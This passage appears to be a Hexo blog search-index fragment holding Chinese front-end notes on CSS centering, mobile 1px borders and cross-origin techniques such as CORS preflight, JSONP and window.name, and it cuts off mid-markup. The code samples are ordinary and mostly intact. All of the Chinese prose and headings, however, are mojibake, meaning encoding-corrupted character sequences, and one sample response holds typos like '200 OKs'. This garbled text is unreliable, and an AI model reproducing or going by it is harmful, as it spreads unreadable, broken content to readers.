class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: table;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: table-cell;</span><br><span class="line">  <span class="attribute">vertical-align</span>:middle;</span><br><span class="line">  <span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>flex</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>position:absolute, 50%, translate</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translate</span>(-50%, -50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>vw, vhå’Œtranslate</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>:fixed;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50vh</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50vw</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translate</span>(-50%, -50%); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>:beforeå’Œdisplay:inline-block</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.container</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="12-ç§»åŠ¨ç«¯1pxé—®é¢˜"><a href="#12-ç§»åŠ¨ç«¯1pxé—®é¢˜" class="headerlink" title="12. ç§»åŠ¨ç«¯1pxé—®é¢˜"></a>12. ç§»åŠ¨ç«¯1pxé—®é¢˜</h4><p>ç”±äºä¸åŒçš„æ‰‹æœºæœ‰ä¸åŒçš„åƒç´ å¯†åº¦å¯¼è‡´çš„ã€‚å¦‚æœç§»åŠ¨æ˜¾ç¤ºå±çš„åˆ†è¾¨ç‡å§‹ç»ˆæ˜¯æ™®é€šå±å¹•çš„2å€ï¼Œ1pxçš„è¾¹æ¡†åœ¨devicePixelRatio=2çš„ç§»åŠ¨æ˜¾ç¤ºå±ä¸‹ä¼šæ˜¾ç¤ºæˆ2pxï¼Œæ‰€ä»¥åœ¨é«˜æ¸…ç“¶ä¸‹çœ‹ç€1pxæ€»æ˜¯æ„Ÿè§‰å˜èƒ–äº†ã€‚</p><ul><li><p>åœ¨ios8+ä¸­å½“devicePixelRatio=2çš„æ—¶å€™ä½¿ç”¨0.5px</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.border &#123; border: 1px solid #999 &#125;</span><br><span class="line">@media screen and (-webkit-min-device-pixel-ratio: <span class="number">2</span>) &#123;</span><br><span class="line">  .border &#123; border: 0.5px solid #999 &#125;</span><br><span class="line">&#125;</span><br><span class="line">@media screen and (-webkit-min-device-pixel-ratio: <span class="number">3</span>) &#123;</span><br><span class="line">  .border &#123; border: 0.333333px solid #999 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>transform: scale(0.5)</p></li></ul><p><br></p><h4 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h4><ul><li><a href="https://leaverou.github.io/css3patterns/" target="_blank" rel="noopener">CSS3 Patterns Gallery çº¹è·¯èƒŒæ™¯</a></li><li><a href="http://www.ruanyifeng.com/blog/2015/07/flex-examples.html" target="_blank" rel="noopener">Flex å¸ƒå±€æ•™ç¨‹ï¼šå®ä¾‹ç¯‡</a></li><li><a href="https://www.jianshu.com/p/d2be62a507b8" target="_blank" rel="noopener">å¤šè¡Œæº¢å‡º</a></li><li>ã€Šå›¾è§£CSS3Â·æ ¸å¿ƒæŠ€æœ¯ä¸æ¡ˆä¾‹å®è·µã€‹ å¤§æ¼ [è‘—]</li><li><a href="https://blog.csdn.net/zh_rey/article/details/77531224" target="_blank" rel="noopener">é˜»æ­¢å› å‡ºç°æ»šåŠ¨æ¡å¯¼è‡´é¡µé¢æŠ–åŠ¨</a></li><li><a href="https://www.jianshu.com/p/69c570f4c1cb" target="_blank" rel="noopener">èƒ½å¤Ÿè®©ä¸å®šå®½é«˜å…ƒç´ æ°´å¹³å’Œå‚ç›´å±…ä¸­çš„æ–¹æ³•</a></li></ul>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSSå˜é‡å®ç°ä¸»é¢˜æ¢è‚¤</title>
      <link href="/2018/11/06/CSS%E5%8F%98%E9%87%8F%E6%8D%A2%E8%82%A4/"/>
      <url>/2018/11/06/CSS%E5%8F%98%E9%87%8F%E6%8D%A2%E8%82%A4/</url>
      <content type="html"><![CDATA[]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>è·¨åŸŸè¯·æ±‚</title>
      <link href="/2018/11/06/JS%E8%B7%A8%E5%9F%9F/"/>
      <url>/2018/11/06/JS%E8%B7%A8%E5%9F%9F/</url>
      <content type="html"><![CDATA[<h3 id="1-åŒæºç­–ç•¥"><a href="#1-åŒæºç­–ç•¥" class="headerlink" title="1. åŒæºç­–ç•¥"></a>1. åŒæºç­–ç•¥</h3><p>ä¸ºä»€ä¹ˆä¼šå‡ºç°è·¨åŸŸï¼Ÿå› ä¸ºå­˜åœ¨åŒæºç­–ç•¥ã€‚</p><blockquote><p>åŒæºç­–ç•¥é™åˆ¶äº†ä»åŒä¸€ä¸ªæºåŠ è½½çš„æ–‡æ¡£æˆ–è„šæœ¬å¦‚ä½•ä¸æ¥è‡ªå¦ä¸€ä¸ªæºçš„èµ„æºè¿›è¡Œäº¤äº’ã€‚è¿™æ˜¯ä¸€ä¸ªç”¨äºéš”ç¦»æ½œåœ¨æ¶æ„æ–‡ä»¶çš„é‡è¦å®‰å…¨æœºåˆ¶ã€‚ï¼ˆåŒæº: å¦‚æœä¸¤ä¸ªé¡µé¢çš„åè®®ï¼Œç«¯å£å’ŒåŸŸåéƒ½ç›¸åŒï¼Œåˆ™ä¸¤ä¸ªé¡µé¢å…·æœ‰ç›¸åŒçš„æºã€‚ï¼‰</p></blockquote><p><br></p><h4 id="1-1-å—åŒæºç­–ç•¥çº¦æŸçš„äº¤äº’"><a href="#1-1-å—åŒæºç­–ç•¥çº¦æŸçš„äº¤äº’" class="headerlink" title="1.1 å—åŒæºç­–ç•¥çº¦æŸçš„äº¤äº’"></a>1.1 å—åŒæºç­–ç•¥çº¦æŸçš„äº¤äº’</h4><ul><li><em>domåŒæºç­–ç•¥</em><br>ç¦æ­¢å¯¹ä¸åŒæºé¡µé¢DOMè¿›è¡Œæ“ä½œã€‚è¿™é‡Œä¸»è¦åœºæ™¯æ˜¯iframeè·¨åŸŸçš„æƒ…å†µï¼Œä¸åŒåŸŸåçš„iframeæ˜¯é™åˆ¶äº’ç›¸è®¿é—®çš„ã€‚</li><li><em>XmlHttpRequeståŒæºç­–ç•¥</em><br>ç¦æ­¢ä½¿ç”¨XHRå¯¹è±¡å‘ä¸åŒæºçš„æœåŠ¡å™¨åœ°å€å‘èµ·HTTPè¯·æ±‚ã€‚<br><br></li></ul><h4 id="1-2-å¯æ‰§è¡Œçš„è·¨æºè®¿é—®"><a href="#1-2-å¯æ‰§è¡Œçš„è·¨æºè®¿é—®" class="headerlink" title="1.2 å¯æ‰§è¡Œçš„è·¨æºè®¿é—®"></a>1.2 å¯æ‰§è¡Œçš„è·¨æºè®¿é—®</h4><ul><li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> æ ‡ç­¾åµŒå…¥è·¨åŸŸè„šæœ¬ </li><li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> æ ‡ç­¾åµŒå…¥CSS</li><li><code>&lt;img&gt;</code>åµŒå…¥å›¾ç‰‡</li><li><code>&lt;video&gt; å’Œ &lt;audio&gt;</code> åµŒå…¥å¤šåª’ä½“èµ„æºã€‚</li><li><code>&lt;object&gt;, &lt;embed&gt; å’Œ &lt;applet&gt;</code>çš„æ’ä»¶</li><li><code>@font-face</code> å¼•å…¥çš„å­—ä½“</li><li><code>&lt;frame&gt; å’Œ &lt;iframe&gt;</code> è½½å…¥çš„ä»»ä½•èµ„æºã€‚ç«™ç‚¹å¯ä»¥ä½¿ç”¨X-Frame-Optionsæ¶ˆæ¯å¤´æ¥é˜»æ­¢è¿™ç§å½¢å¼çš„è·¨åŸŸäº¤äº’ã€‚</li><li><code>CORS</code>è·¨åŸŸèµ„æºå…±äº«æœºåˆ¶ï¼Œå…è®¸è·¨åŸŸè®¿é—®</li></ul><p><br></p><h3 id="2-è·¨åŸŸè§£å†³æ–¹æ¡ˆ"><a href="#2-è·¨åŸŸè§£å†³æ–¹æ¡ˆ" class="headerlink" title="2. è·¨åŸŸè§£å†³æ–¹æ¡ˆ"></a>2. è·¨åŸŸè§£å†³æ–¹æ¡ˆ</h3><h4 id="2-1-CORS"><a href="#2-1-CORS" class="headerlink" title="2.1 CORS"></a>2.1 CORS</h4><p>CORS è·¨åŸŸèµ„æºå…±äº«ï¼Œå®ƒå…è®¸æµè§ˆå™¨å‘è·¨åŸŸæœåŠ¡å™¨ï¼Œå‘å‡ºXMLHttpRequestè¯·æ±‚ï¼Œä»è€Œå…‹æœajaxåªèƒ½åŒæºä½¿ç”¨çš„é™åˆ¶ã€‚</p><p>æ•´ä¸ªCORSé€šä¿¡è¿‡ç¨‹ï¼Œç”±æµè§ˆå™¨è‡ªåŠ¨å®Œæˆï¼Œå¯¹å¼€å‘è€…æ¥è¯´ï¼ŒCORSé€šä¿¡ä¸ajaxæ²¡æœ‰å·®åˆ«ã€‚æµè§ˆå™¨ä¸€æ—¦å‘ç°ajaxè¯·æ±‚è·¨æºï¼Œä¼šè‡ªåŠ¨æ·»åŠ ä¸€äº›é™„åŠ çš„å¤´ä¿¡æ¯ï¼Œæœ‰æ—¶è¿˜ä¼šå¤šå‡ºä¸€æ¬¡é™„åŠ çš„è¯·æ±‚ï¼Œä½†ç”¨æˆ·ä¸ä¼šæœ‰æ„Ÿè§‰ã€‚CORSé€šä¿¡çš„å…³é”®æ˜¯æœåŠ¡å™¨ã€‚åªè¦æœåŠ¡å™¨å®ç°äº†CORSæ¥å£ï¼Œå°±å¯ä»¥è·¨æºé€šä¿¡ã€‚æµè§ˆå™¨å°†CORSè¯·æ±‚åˆ†æˆä¸¤ç±»ï¼šç®€å•è¯·æ±‚å’Œéç®€å•è¯·æ±‚ã€‚</p><p><br></p><h5 id="2-1-1-è§¦å‘é¢„è¯·æ±‚"><a href="#2-1-1-è§¦å‘é¢„è¯·æ±‚" class="headerlink" title="2.1.1 è§¦å‘é¢„è¯·æ±‚"></a>2.1.1 è§¦å‘é¢„è¯·æ±‚</h5><p>å½“è¯·æ±‚æ»¡è¶³ä¸‹è¿°ä»»ä¸€æ¡ä»¶æ—¶ï¼Œå³ä¼šè§¦å‘é¢„æ£€è¯·æ±‚ï¼š</p><ul><li><p>ä½¿ç”¨äº†ä¸‹é¢ä»»ä¸€HTTPæ–¹æ³•ï¼š</p><ul><li>PUT</li><li>DELETE</li><li>CONNECT</li><li>OPTIONS</li><li>TRACE</li><li>PATCH</li></ul></li><li><p>äººä¸ºè®¾ç½®äº†ä¸‹é¢å­—æ®µä»¥å¤–çš„å…¶ä»–é¦–éƒ¨å­—æ®µï¼š</p><ul><li>Accept</li><li>Accept-Language</li><li>Content-Language</li><li>Content-Type</li><li>DPR</li><li>Downlink</li><li>Save-Data</li><li>Viewport-Width</li><li>Width</li></ul></li><li><p><code>Content-Type</code>çš„å€¼ä¸å±äºä¸‹åˆ—ä¹‹ä¸€</p><ul><li>application/x-www-form-urlencoded</li><li>multipart/form-data</li><li>text/plain</li></ul></li><li><p>è¯·æ±‚ä¸­çš„<code>XMLHttpRequestUpload</code>å¯¹è±¡æ³¨å†Œäº†ä»»ä¸€å¤šä¸ªäº‹ä»¶ç›‘å¬å™¨</p></li><li>è¯·æ±‚ä¸­ä½¿ç”¨<code>ReadableStream</code>å¯¹è±¡</li></ul><p><br><br><em>Q: æœ‰ä¸€ä¸ªéœ€æ±‚å¤æ‚çš„è€é¡¹ç›®ï¼Œæ¯ä¸ªè¯·æ±‚éƒ½ä¼šè§¦å‘é¢„è¯·æ±‚ã€‚æ€æ ·æ¶ˆé™¤é¢„è¯·æ±‚ï¼Œå‡å°‘è¯·æ±‚æ•°ï¼Ÿ</em></p><p><br></p><h5 id="2-2-2-ç®€å•è¯·æ±‚"><a href="#2-2-2-ç®€å•è¯·æ±‚" class="headerlink" title="2.2.2 ç®€å•è¯·æ±‚"></a>2.2.2 ç®€å•è¯·æ±‚</h5><p>å¯¹äºç®€å•è¯·æ±‚ï¼Œæµè§ˆå™¨ç›´æ¥å‘å‡ºCORSè¯·æ±‚ï¼Œå¹¶åœ¨å¤´ä¿¡æ¯ä¸­ï¼Œå¢åŠ <code>Origin</code>å­—æ®µ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /cors HTTP/1.1</span><br><span class="line">Origin: http://api.bob.com</span><br><span class="line">Host: api.alice.com</span><br></pre></td></tr></table></figure></p><p>å¦‚æœ<code>Origin</code>æŒ‡å®šçš„æºï¼Œä¸åœ¨è®¸å¯èŒƒå›´å†…ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„HTTPå›åº”ï¼Œå›åº”å¤´ä¿¡æ¯ä¸­æ²¡æœ‰<code>Access-Control-Allow-Origin</code>å­—æ®µï¼Œå°±çŸ¥é“é”™äº†ï¼Œä»è€ŒæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œè¢«<code>XMLHttpRequest</code>çš„<code>onerror</code>å›è°ƒå‡½æ•°æ•è·ã€‚</p><p>å¦‚æœ<code>Origin</code>æŒ‡å®šçš„æºåœ¨è®¸å¯èŒƒå›´å†…ï¼ŒæœåŠ¡å™¨è¿”å›çš„å“åº”ï¼Œä¼šå¤šå‡ºå‡ ä¸ªå¤´ä¿¡æ¯å­—æ®µã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://api.bob.com  // æ¥å—å“ªäº›åŸŸåçš„è¯·æ±‚</span><br><span class="line">Access-Control-Allow-Credentials: true           // æ˜¯å¦å…è®¸å‘é€cookie</span><br><span class="line">Access-Control-Expose-Headers: FooBar            // å¯é€‰</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="2-2-3-éç®€å•è¯·æ±‚"><a href="#2-2-3-éç®€å•è¯·æ±‚" class="headerlink" title="2.2.3 éç®€å•è¯·æ±‚"></a>2.2.3 éç®€å•è¯·æ±‚</h5><p>éç®€å•è¯·æ±‚ï¼Œä¼šåœ¨æ­£å¼é€šä¿¡ä¹‹å‰ï¼Œå¢åŠ ä¸€æ¬¡HTTPæŸ¥è¯¢è¯·æ±‚ï¼Œç§°ä¸ºâ€œé¢„æ£€â€ï¼ˆpreflightï¼‰ã€‚<br><em>é¢„æ£€è¯·æ±‚</em>ç”¨çš„è¯·æ±‚æ–¹æ³•æ˜¯<code>OPTIONS</code>ï¼Œè¡¨ç¤ºè¿™ä¸ªè¯·æ±‚æ˜¯ç”¨æ¥è¯¢é—®çš„ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// é¢„æ£€è¯·æ±‚çš„å¤´ä¿¡æ¯</span><br><span class="line">OPTIONS /cors HTTP/1.1</span><br><span class="line">Origin: http://api.bob.com</span><br><span class="line">Access-Control-Request-Method: PUT</span><br><span class="line"></span><br><span class="line">// æŒ‡å®šæµè§ˆå™¨CORSè¯·æ±‚ä¼šé¢å¤–å‘é€çš„å¤´ä¿¡æ¯å­—æ®µ</span><br><span class="line">Access-Control-Request-Headers: X-Custom-Header </span><br><span class="line">Host: api.alice.com</span><br></pre></td></tr></table></figure></p><p>æœåŠ¡å™¨æ”¶åˆ°â€œé¢„æ£€â€è¯·æ±‚å·ï¼Œæ£€æŸ¥äº†<code>Origin, Access-Control-Request-Method å’Œ Access-Control-Request-Headers</code>å­—æ®µåï¼Œç¡®å®šå…è®¸è·¨åŸŸè¯·æ±‚ï¼Œåšå‡ºå›åº”ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OKs</span><br><span class="line">// æœåŠ¡å™¨å›åº”çš„CORSç›¸å…³å­—æ®µ</span><br><span class="line">Access-Control-Allow-Origin: http://api.bob.coms</span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class="line">Access-Control-Max-Age: 1728000</span><br></pre></td></tr></table></figure></p><p>å¦‚æœæœåŠ¡å™¨å¦å®šäº†â€œé¢„æ£€â€è¯·æ±‚ï¼Œä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„HTTPå›åº”ï¼Œä½†æ²¡æœ‰ä»»ä½•CORSç›¸å…³çš„å¤´ä¿¡æ¯å­—æ®µã€‚æµè§ˆå™¨ä¼šè®¤å®šæœåŠ¡å™¨ä¸åŒæ„é¢„æ£€è¯·æ±‚ï¼Œå› æ­¤è§¦å‘ä¸€ä¸ªé”™è¯¯ï¼Œè¢«<code>XMLHttpRequest</code>çš„<code>onerror</code>å›è°ƒå‡½æ•°æ•è·ã€‚</p><p><br></p><h5 id="2-2-4-withCredentials"><a href="#2-2-4-withCredentials" class="headerlink" title="2.2.4 withCredentials"></a>2.2.4 withCredentials</h5><p>CORSè¯·æ±‚é»˜è®¤ä¸å‘é€Cookieå’ŒHTTPè®¤è¯ä¿¡æ¯ã€‚å¦‚æœè¦æŠŠcookieå‘åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨éœ€è¦æŒ‡å®š<code>Access-Control-Allow-Credentials</code>å­—æ®µã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure></p><p>å¼€å‘è€…å¿…é¡»åœ¨ajaxè¯·æ±‚ä¸­æ‰“å¼€<code>withCredentials</code>å±æ€§ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.withCredentials = true;</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„ï¼Œå¦‚æœè¦å‘é€Cookieï¼Œ<code>Access-Control-Allow-Origin</code>ä¸èƒ½è®¾ä¸ºæ˜Ÿå·ï¼Œå¿…é¡»æŒ‡å®šæ˜ç¡®çš„ï¼Œä¸è¯·æ±‚ç½‘é¡µä¸€è‡´çš„åŸŸåã€‚åŒæ—¶ï¼ŒCookieä»éµå¾ªåŒæºæ”¿ç­–ï¼Œè·¨æº(åŸç½‘é¡µä»£ç ä¸­)çš„<code>document.cookie</code>æ— æ³•è¯»å–æœåŠ¡å™¨åŸŸåä¸‹çš„Cookieã€‚</p><p><br></p><h4 id="2-2-jsonp"><a href="#2-2-jsonp" class="headerlink" title="2.2 jsonp"></a>2.2 jsonp</h4><p>åˆ©ç”¨<code>&lt;script&gt;</code>æ ‡ç­¾æ²¡æœ‰è·¨åŸŸé™åˆ¶çš„â€æ¼æ´â€œæ¥è¾¾åˆ°å’Œç¬¬ä¸‰æ–¹é€šä¿¡çš„ç›®çš„ã€‚<br>éœ€è¦é€šè®¯æ—¶ï¼Œåˆ›å»ºä¸€ä¸ª<code>&lt;script&gt;</code>å…ƒç´ ï¼Œåœ°å€æŒ‡å‘ç¬¬ä¸‰æ–¹APIç½‘å€ï¼Œå¹¶æä¾›ä¸€ä¸ªå›è°ƒå‚æ•°æ¥æ¥æ”¶æ•°æ®ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¯·æ±‚ä¸­å¯ä»¥å¢åŠ å‚æ•°</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">'http://xxx.com/xxxx?prams=xxx&amp;callback=functionHandler'</span>;</span><br><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">script.setAttribute(<span class="string">'src'</span>, url);</span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(script);</span><br></pre></td></tr></table></figure></p><p>æœåŠ¡å™¨è¿”å›çš„scriptæ–‡ä»¶å†…å®¹<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(data)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-æœåŠ¡å™¨ä»£ç†"><a href="#2-3-æœåŠ¡å™¨ä»£ç†" class="headerlink" title="2.3 æœåŠ¡å™¨ä»£ç†"></a>2.3 æœåŠ¡å™¨ä»£ç†</h4><p>åœ¨æœåŠ¡å™¨ç«¯é…ç½®å¥½ä»£ç†ï¼Œæµè§ˆå™¨ç«¯å°±ä¸ä¼šå‡ºç°è·¨åŸŸçš„é—®é¢˜<br>åœ¨å¼€å‘é˜¶æ®µæ¯”è¾ƒå¸¸å®ç°<br>devseverçš„proxyå°±æ˜¯ç”¨æ¥è¯¥åŸç†<br>åœ¨devseverä¸­é…ç½®ä»£ç†ï¼ŒåŸæŒ‡å‘devserverçš„è¯·æ±‚è¢«ä»£ç†åˆ°ç›®æ ‡åœ°å€ï¼Œåœ¨æœåŠ¡å™¨ä¸­httpè¯·æ±‚æ²¡æœ‰è·¨åŸŸé™åˆ¶ï¼Œæ‰€ä»¥è§£å†³äº†æµè§ˆå™¨jsè·¨åŸŸçš„é—®é¢˜</p><p><br></p><h4 id="2-4-document-domain"><a href="#2-4-document-domain" class="headerlink" title="2.4 document.domain"></a>2.4 document.domain</h4><p>ä¿®æ”¹<code>document.domain</code>å®ç°å­åŸŸä¸åŒçš„é¡µé¢è¿›è¡Œè·¨åŸŸäº¤äº’ã€‚<code>document.domain</code>å­˜æ”¾çš„æ˜¯è½½å…¥æ–‡æ¡£çš„æœåŠ¡å™¨çš„ä¸»æœºåï¼Œå¯ä»¥æ‰‹åŠ¨è®¾ç½®è¿™ä¸ªå±æ€§ï¼Œä½†åªèƒ½è®¾ç½®æˆå½“å‰åŸŸåæˆ–ä¸Šçº§åŸŸåï¼Œå¦‚id.qq.com, qq.comã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.domain = é¡¶çº§åŸŸå</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-5-window-name"><a href="#2-5-window-name" class="headerlink" title="2.5 window.name"></a>2.5 window.name</h4><p><code>window.name</code>åˆ©ç”¨åŒä¸€çª—ä½“ä¸‹åŠ è½½ä¸åŒçš„é¡µé¢ï¼Œwindow.nameçš„å€¼ä¸ä¼šæ¸…é™¤ï¼Œè¾¾åˆ°ä¼ é€’æ•°æ®çš„æ•ˆæœã€‚ï¼ˆæ•°æ®å¤§å°æ”¯æŒåˆ°2MBï¼‰ã€‚å…·ä½“æ“ä½œéœ€è¦3ä¸ªé¡µé¢<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a åŸŸåä¸‹çš„ origin page</span><br><span class="line">a åŸŸåä¸‹çš„ proxy page</span><br><span class="line">b åŸŸåä¸‹çš„ data page</span><br></pre></td></tr></table></figure></p><p>a åŸŸåä¸‹origin page é€šè¿‡åŠ¨æ€çš„iframe åŠ è½½ data page, data pageä¸­è®¾ç½®äº†window.name = dataæ•°æ®ã€‚</p><p>å¯æ˜¯æ­¤æ—¶ origin pageçš„åŸŸåä¸data pageåŸŸåä¸ä¸€è‡´ï¼Œæµè§ˆå™¨é™åˆ¶äº¤äº’ï¼Œæ‰€ä»¥éœ€è¦å°†iframeè·³è½¬åˆ°proxy pageï¼ˆå³iframeçš„scrå€¼è®¾ç½®ä¸ºproxy pageï¼‰ã€‚æ­¤æ—¶iframeä¸ origin pageåŒæºï¼Œå¯ä»¥æ“ä½œè·å–åˆ°iframe çš„window.nameä¸­çš„æ•°æ®ï¼Œè·å–å®Œæ¯•åé”€æ¯iframeã€‚</p><p>è¿™æ ·origin pageå°±å¯ä»¥è·å–åˆ°éåŒæºä¸‹çš„ data pageæ•°æ®ã€‚</p><p>aåŸŸåä¸‹çš„ origin page<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="built_in">document</span>.getElementsByTagName(<span class="string">"button"</span>)[<span class="number">0</span>];</span><br><span class="line">a.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;                               </span><br><span class="line">    <span class="keyword">var</span> inf=<span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);       <span class="comment">//åˆ›å»ºiframe</span></span><br><span class="line">    inf.src=<span class="string">"http://www.b.com/data.html"</span>+<span class="string">"?h=5"</span>     <span class="comment">//åŠ è½½æ•°æ®é¡µwww.b.com/data.html?h=5</span></span><br><span class="line">    <span class="keyword">var</span> body=<span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>];</span><br><span class="line">    body.appendChild(inf);                          <span class="comment">//å¼•å…¥aé¡µé¢</span></span><br><span class="line"></span><br><span class="line">    inf.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        inf.src=<span class="string">'http://www.a.com/proxy.html'</span>       <span class="comment">//iframeåŠ è½½å®Œæˆï¼ŒåŠ è½½www.a.comåŸŸä¸‹è¾¹çš„ç©ºç™½é¡µproxy.html</span></span><br><span class="line">        <span class="built_in">console</span>.log(inf.contentWindow.name)        <span class="comment">//è¾“å‡ºwindow.nameä¸­çš„æ•°æ®</span></span><br><span class="line">        